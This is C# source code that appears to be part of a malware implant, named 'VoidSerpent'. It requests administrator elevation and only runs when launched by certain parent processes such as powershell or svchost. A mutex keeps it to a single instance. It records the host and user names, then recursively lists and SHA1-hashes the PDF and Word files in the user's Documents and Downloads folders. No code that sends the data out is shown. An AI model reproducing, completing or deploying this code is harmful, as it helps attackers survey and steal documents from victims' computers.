using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace VoidSerpent
{
    public static class BetrayalIsASymptom
    {

        private static Mutex mutex = null;
        public static bool IsUserAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void RequestElevation(string applicationPath, string[] arguments)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = $"\"{applicationPath}\"",
                Arguments = string.Join(" ", arguments),
                Verb = "runas",
                UseShellExecute = true
            };
            try
            {
                Process.Start(startInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to request elevation: " + ex.Message);
            }
        }

        static Process GetParentProcess(Process process)
        {
            try
            {
                int parentPid = 0;
                using (var query = new ManagementObjectSearcher($"SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = {process.Id}"))
                {
                    foreach (var item in query.Get())
                    {
                        parentPid = Convert.ToInt32(item["ParentProcessId"]);
                        break;
                    }
                }
                return parentPid > 0 ? Process.GetProcessById(parentPid) : null;
            }
            catch (Exception)
            {
                return null; // parent process Id not found
            }
        }

        public static bool protectedStart()
        {
            bool safe = true;

            // Protect startup to control who launches
            Process cProc = Process.GetCurrentProcess();
            Process pProc = GetParentProcess(cProc);
            string[] authorizedParents = { "powershell", "taskhostw", "svchost", "devenv" };
            if (!authorizedParents.Contains(pProc.ProcessName))
            {
                safe = false;
            }

            // Ensure only one instance is running
            string mtx = "beavup";
            bool createdNew;
            mutex = new Mutex(true, mtx, out createdNew);
            if (!createdNew) // another instance is running
            {
                safe = false;
            }

            return safe;
        }
    }

    public static class ToWakeAndAvengeTheDead
    {
        public static HostInfo GetHostInfo()
        {
            string ComputerName = Environment.GetEnvironmentVariable("COMPUTERNAME");
            string UserName = Environment.GetEnvironmentVariable("USERNAME");
            return new HostInfo(ComputerName, UserName);
        }

        public class HostInfo
        {
            public string ComputerName { get; set; }
            public string UserName { get; set; }

            public HostInfo(string computerName, string userName)
            {
                ComputerName = computerName;
                UserName = userName;
            }
        }

        public static List<(string Path, string Sha1Hash)> EnumerateFiles()
        {
            // Get the user's Documents and Downloads folders
            string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string downloadsPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");

            // Define the file extensions we're interested in
            List<string> validExtensions = new List<string>
        {
            ".pdf",
            ".doc",
            ".docx"
        };

            // Create a list to store the results
            List<(string Path, string Sha1Hash)> result = new List<(string Path, string Sha1Hash)>();

            // Helper function to add files from a directory to the result list
            void AddFilesFromDirectory(string directoryPath)
            {
                try
                {
                    foreach (string file in Directory.GetFiles(directoryPath))
                    {
                        var fileInfo = new FileInfo(file);
                        if (validExtensions.Contains(fileInfo.Extension.ToLower()))
                        {
                            string sha1Hash = GetFileSha1Hash(file);
                            result.Add((file, sha1Hash));
                        }
                    }

                    // Recursively add files from subdirectories
                    foreach (string subdir in Directory.GetDirectories(directoryPath))
                    {
                        AddFilesFromDirectory(subdir);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error processing directory {directoryPath}: {ex.Message}");
                }
            }

            // Add files from the Documents folder
            AddFilesFromDirectory(documentsPath);

            // Add files from the Downloads folder
            AddFilesFromDirectory(downloadsPath);

            return result;
        }

        public static string GetFileSha1Hash(string filePath)
        {
            using (SHA1 sha1 = SHA1.Create())
            {
                byte[] fileBytes = File.ReadAllBytes(filePath);
                byte[] hashBytes = sha1.ComputeHash(fileBytes);

                // Convert the byte array to a hexadecimal string
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    builder.Append(hashBytes[i].ToString("x2"));
                }

                return builder.ToString();
            }
        }
    }

    public static class ShortcutsThroughGraveyards
    {

    }
}